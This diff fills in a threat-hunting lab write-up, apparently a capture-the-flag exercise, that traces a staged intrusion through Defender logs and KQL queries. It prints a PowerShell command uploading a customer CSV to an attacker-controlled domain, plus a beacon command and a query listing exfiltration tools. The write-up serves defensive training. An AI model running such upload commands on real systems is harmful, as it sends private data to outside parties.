@@ -787,7 +787,7 @@ The initial communications with the attacker-controlled domain showed a consiste
 | Field | Value |
 |------|-------|
 | Host | npt-ws01 |
-| Timestamp | 2026-06-16T20:58:02.3673704Z (initial beacon activity) |
+| Timestamp | 2026-06-16T23:15:47.0470725Z|
 | Process | powershell.exe |
 | Parent Process |  powershell.exe |
 | Command Line | "powershell.exe" -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri "https://updates.sync-northpeak.com/api/status?host=NPT-WS01" -UseBasicParsing -TimeoutSec 4 |
@@ -833,31 +833,45 @@ Automated beacon, regular timing indicates a scheduled/scripted callback mechani
 `HUNT LEAD: "Last thing they did was take the crown jewels out. Name the file, the host it left from, and where it went."`
 
 ### 📌 Finding
-<High-level description of the activity>
+The attacker performed the final stage of the intrusion by exfiltrating sensitive customer data from the server environment. A PowerShell-based upload command transferred the file `customer_data_export_20260616.csv` from `npt-srv01` to the attacker-controlled command-and-control infrastructure at:`https://cdn.sync-northpeak.com/api/upload?host=NPT-SRV01&data=customers` The exfiltration was performed using `Invoke-WebRequest`, allowing the attacker to send collected data directly to their external infrastructure over HTTPS.
+
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
 | Host | <Placeholder> |
-| Timestamp | <Placeholder> |
-| Process | <Placeholder> |
-| Parent Process | <Placeholder> |
-| Command Line | <Placeholder> |
+| Timestamp | 2026-06-16T23:44:08.034865Z |
+| Process | powershell.exe |
+| Parent Process | powershell.exe |
+| Command Line | "powershell.exe" -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://cdn.sync-northpeak.com/api/upload?host=NPT-SRV01&data=customers' -InFile 'C:\temp\customer_data_export_20260616.csv' -UseBasicParsing -TimeoutSec 5  |
 
 ### 💡 Why it matters
-<Explain impact, risk, and relevance>
+Data exfiltration represents the final objective of the intrusion and confirms the attacker successfully moved beyond initial access and persistence into data theft.
+
+The use of PowerShell and HTTPS-based web requests allowed the attacker to:
+- Transfer sensitive data without deploying additional tools.
+- Blend malicious traffic with normal web communication.
+- Avoid detection by using built-in Windows utilities.
+- Exfiltrate customer information from a high-value server asset.
+
+The presence of a staged CSV export file indicates the attacker first collected and prepared the data before transferring it to external infrastructure.
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+```kql
+DeviceProcessEvents
+| where Timestamp between (datetime(2026-06-16T20:00:00Z) .. datetime(2026-06-17T00:30:00Z))
+| where DeviceName has_any ("npt-ws01", "npt-srv01")
+| where ProcessCommandLine has_any ("7z", "rar", "Compress-Archive", "rclone", "curl", "wget", "Invoke-WebRequest", "UploadFile", "bitsadmin"
+)
+| project Timestamp, DeviceName, FileName, ProcessCommandLine
+```
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="975" height="269" alt="image" src="https://github.com/user-attachments/assets/66c28f22-fefd-45ff-a465-f32265c6e79a" />
 
-### 🛠️ Detection Recommendation
-
-**Hunting Tip:**  
-<Actionable guidance for defenders>
+**Answer:**  
+customer_data_export_20260616.csv, npt-srv01, cdn.sync-northpeak.com
 
 </details>
 
@@ -870,26 +884,51 @@ Automated beacon, regular timing indicates a scheduled/scripted callback mechani
 `HUNT LEAD: "That export went out while they were live in a remote session on the server, and there were two sessions. Tell me which one they were in when they did it: the first, or the one they came back through."`
 
 ### 📌 Finding
-<High-level description of the activity>
+The customer data export occurred at `2026-06-16T23:44:08.034865Z`, shortly after the attacker established their second remote interactive session on `npt-srv01` at `2026-06-16T23:42:52.7446674Z`.
+
+The first remote session began at `2026-06-16T21:58:08.9960818Z`, while the second session occurred immediately before the exfiltration event. The timeline correlation confirms the attacker returned through the second remote session and performed the data theft from that session.
+
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
-| Timestamp | <Placeholder> |
-| Process | <Placeholder> |
-| Parent Process | <Placeholder> |
-| Command Line | <Placeholder> |
+| Host | npt-srv01 |
+| Timestamp | 2026-06-16T23:42:52.7446674Z`|
+| Process | lsass.exe |
+| Parent Process | N/a |
+| Command Line | N/a |
 
 ### 💡 Why it matters
-<Explain impact, risk, and relevance>
+Correlating authentication activity with process execution allows defenders to attribute actions to the correct attacker session. In this case, the attacker did not perform exfiltration during their original access session; they returned through a second remote interactive session immediately before transferring the customer export file.
+
+This matters because:
+- It establishes the attacker's operational timeline.
+- It links the exfiltration event to a specific authenticated session.
+- It helps identify compromised accounts used for remote access.
+- It prevents incorrect attribution when multiple sessions exist on the same host.
+
+Remote session correlation is critical during incident response because attackers frequently disconnect and reconnect, creating multiple logon artifacts that can obscure the actual timeline.
 
 ### 🔧 KQL Query Used
-<Add KQL here>
+
+### 🔧 KQL Query Used
+```kql
+DeviceLogonEvents
+| where DeviceName == "npt-srv01"
+| where TimeGenerated between (
+    datetime(2026-06-16 20:00:00) ..
+    datetime(2026-06-17 00:30:00)
+)
+| where LogonType == "RemoteInteractive"
+| project Timestamp, DeviceName, AccountName, RemoteIP, LogonType, ActionType
+| order by Timestamp asc
+
+```
 
 ### 🖼️ Screenshot
-<Insert screenshot>
+<img width="975" height="199" alt="image" src="https://github.com/user-attachments/assets/ab29c6d2-8008-4676-82e8-7b23f18c2d0c" />
+
 
 ### 🛠️ Detection Recommendation
 
